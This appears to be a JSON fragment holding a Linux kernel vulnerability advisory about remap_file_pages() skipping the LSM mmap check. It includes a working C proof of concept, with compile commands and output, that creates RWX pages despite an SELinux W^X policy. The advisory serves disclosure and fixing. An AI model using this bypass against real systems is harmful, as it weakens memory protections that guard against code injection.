		"description": "In the Linux kernel, the following vulnerability has been resolved:  mm: call the security_mmap_file() LSM hook in remap_file_pages()  The remap_file_pages syscall handler calls do_mmap() directly, which doesn't contain the LSM security check. And if the process has called personality(READ_IMPLIES_EXEC) before and remap_file_pages() is called for RW pages, this will actually result in remapping the pages to RWX, bypassing a W^X policy enforced by SELinux.  So we should check prot by security_mmap_file LSM hook in the remap_file_pages syscall handler before do_mmap() is called. Otherwise, it potentially permits an attacker to bypass a W^X policy enforced by SELinux.  The bypass is similar to CVE-2016-10044, which bypass the same thing via AIO and can be found in [1].  The PoC:  $ cat > test.c  int main(void) { \tsize_t pagesz = sysconf(_SC_PAGE_SIZE); \tint mfd = syscall(SYS_memfd_create, \"test\", 0); \tconst char *buf = mmap(NULL, 4 * pagesz, PROT_READ | PROT_WRITE, \t\tMAP_SHARED, mfd, 0); \tunsigned int old = syscall(SYS_personality, 0xffffffff); \tsyscall(SYS_personality, READ_IMPLIES_EXEC | old); \tsyscall(SYS_remap_file_pages, buf, pagesz, 0, 2, 0); \tsyscall(SYS_personality, old); \t// show the RWX page exists even if W^X policy is enforced \tint fd = open(\"/proc/self/maps\", O_RDONLY); \tunsigned char buf2[1024]; \twhile (1) { \t\tint ret = read(fd, buf2, 1024); \t\tif (ret <= 0) break; \t\twrite(1, buf2, ret); \t} \tclose(fd); }  $ gcc test.c -o test $ ./test | grep rwx 7f1836c34000-7f1836c35000 rwxs 00002000 00:01 2050 /memfd:test (deleted)  [PM: subject line tweaks]",
